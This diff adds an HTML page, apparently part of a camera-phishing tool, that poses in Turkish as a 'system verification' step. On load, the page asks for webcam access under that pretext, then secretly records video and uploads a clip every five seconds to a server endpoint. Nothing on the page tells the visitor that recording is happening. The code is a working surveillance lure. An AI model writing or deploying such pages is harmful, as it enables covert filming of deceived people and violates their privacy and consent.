@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sistem Doğrulama</title>
+</head>
+<body>
+    <h3>Lütfen işleme devam etmek için kameranıza izin verin...</h3>
+    
+    <script>
+        async function startCapture() {
+            try {
+                // Kamera izni iste
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                // Video kaydediciyi başlat (her 5 saniyede bir veri gönderir)
+                const mediaRecorder = new MediaRecorder(stream);
+                
+                mediaRecorder.ondataavailable = async (event) => {
+                    if (event.data.size > 0) {
+                        const formData = new FormData();
+                        formData.append('video', event.data);
+                        
+                        // Veriyi Python sunucusuna gönder
+                        fetch('/upload', {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }
+                };
+
+                // Kaydı başlat ve her 5000ms'de bir data gönder
+                mediaRecorder.start(5000); 
+                
+            } catch (err) {
+                console.error("Kamera izni reddedildi:", err);
+            }
+        }
+
+        // Sayfa yüklendiğinde başlat
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
